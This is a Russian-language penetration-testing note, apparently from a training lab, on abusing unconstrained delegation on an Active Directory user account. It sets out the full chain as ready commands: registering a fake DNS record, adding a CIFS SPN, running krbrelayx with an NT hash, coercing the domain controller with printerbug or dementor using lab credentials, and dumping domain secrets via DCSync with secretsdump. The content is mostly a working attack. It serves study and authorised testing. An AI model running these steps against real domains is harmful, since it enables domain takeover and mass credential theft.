#AD #attacks #windows #delegation #kerberos 

> Пользователи в Active Directory также могут быть настроены на неограниченное делегирование, и это совсем другая история. Если нам каким-то образом удалось взломать эту учетную запись, нам также нужно иметь возможность обновлять список SPN, поэтому нам нужна учетная запись с `GenericWrite` привилегиями в отношении взломанной учетной записи.

## Ход атаки

Создаем DNS-запись, которая будет указывать на нашу атакующую машину. Эта DNS-запись будет представлять собой поддельный компьютер в среде Active Directory. После регистрации этой DNS-записи мы добавим имя субъекта-службы `CIFS/our_dns_record` к скомпрометированной учетной записи, которая имеет неограниченные права делегирования. Таким образом, если жертва попытается подключиться по протоколу SMB к нашему поддельному компьютеру, она отправит копию своего TGT в билете TGS, поскольку запросит билет для `CIFS/our_registration_dns`. Этот билет TGS будет отправлен на IP-адрес, который мы выбрали при регистрации DNS-записи, то есть на наш атакующий компьютер. Все, что нам нужно сделать, — это извлечь TGT и использовать его.

Мы можем воспользоваться этой привилегией неограниченного делегирования, чтобы стать администратором домена, если будут выполнены следующие условия

### Для этой техники аккаунт, на котором создаётся SPN, должен находиться под Unconstrained Delegation, а атакующий должен иметь возможность изменять его SPN, например через `GenericWrite`.

Цепочка атаки
```text
Compromised account
       │
       │ GenericWrite
       ▼
Fake DNS record
       │
       ▼
CIFS/<fake-host>
       │
       ▼
SPN на compromised account
       │
       ▼
PrinterBug
       │
       ▼
DC authentication
       │
       ▼
TGT DC$
       │
       ▼
DCSync
```

Для этого используются инструменты `krbrelayx`, включая `dnstool.py`, `addspn.py` и `krbrelayx.py`.

### Fake DNS

```bash
python dnstool.py \
    -u <DOMAIN>\\<USER> \
    -p <PASSWORD> \
    -r <fake-host> \
    -d <ATTACKER-IP> \
    --action add \
    <DC-IP>
```

Проверка:

```bash
nslookup <fake-host> <dc-host>
```

### Добавление SPN

```bash
python addspn.py \
    -u <DOMAIN>\\<USER> \
    -p <PASSWORD> \
    --target-type samname \
    -t <TARGET-USER> \
    -s CIFS/<fake-host> \
    <DC-IP>
```

## Запускаем krbrelayx для прослушивания

```bash
sudo python krbrelayx.py -hashes :cf3a5525ee9414229e66279623ed5c58
```

## Параллельно принуждаем DC к аутентификаци

```bash
python3 printerbug.py inlanefreight.local/carole.rose:jasmine@10.129.205.35 roguecomputer.inlanefreight.local
# ИЛИ
python dementor.py -u pixis -p p4ssw0rd -d inlanefreight.local roguecomputer.inlanefreight.local dc01.inlanefreight.**local**
```

## DCSync

```bash
export KRB5CCNAME=./DC01\$@INLANEFREIGHT.LOCAL_krbtgt@INLANEFREIGHT.LOCAL.ccache  

secretsdump.py -k -no-pass dc01.inlanefreight.local
```
